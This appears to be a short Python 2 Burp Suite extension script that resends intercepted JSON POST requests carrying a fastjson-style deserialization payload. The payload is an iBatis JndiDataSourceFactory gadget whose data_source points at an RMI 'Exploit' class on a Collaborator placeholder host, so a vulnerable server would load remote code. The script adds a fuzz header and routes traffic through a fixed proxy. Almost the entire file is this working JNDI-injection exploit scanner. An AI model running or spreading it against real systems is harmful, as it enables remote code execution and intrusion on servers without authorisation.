import urlparse
import requests

if  messageIsRequest:
        request = messageInfo.getRequest()
        analyzedRequest = helpers.analyzeRequest(messageInfo) # returns IResponseInfo
        headers = analyzedRequest.getHeaders()
        print(headers)
        url = str(analyzedRequest.getUrl())
        parsedTuple = urlparse.urlparse(url)
        payload_url = parsedTuple.netloc
        #print(payload_url.split(":")[0])
        payload = '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://$collabplz/Exploit"}}'
        payload_url.split(":")[0]
        import urllib
        import urllib2
        if "x-fuzz" not in str(headers) and "Content-Type: application/json" in str(headers):
            header_lib = dict()
            print("xxxxxxx")
            if "POST" in headers[0]:
                for n in headers:
                    if "HTTP/1." in n or "Host:" in n:
                        pass
                    else:
                        tmp = str(n).split(":")
                        if len(tmp)==2:
                            header_lib[tmp[0]]= tmp[1].strip()
                        elif len(tmp)==3:
                            header_lib[tmp[0]]= tmp[1].strip()+tmp[2].strip()
            header_lib['x-fuzz'] = 'fuzz by komi'
            proxies = {"http":"http://192.168.1.184:8080","https":"http://192.168.1.184:8080"}
            try:
                res=requests.post(url, headers=header_lib,data=payload,timeout=5,verify=False, allow_redirects="True", proxies=proxies)
                print ("[*]--------------------------------------Test %s -----------------------------------------------------[*]" % (url))
            except Exception as e:
                print(e)
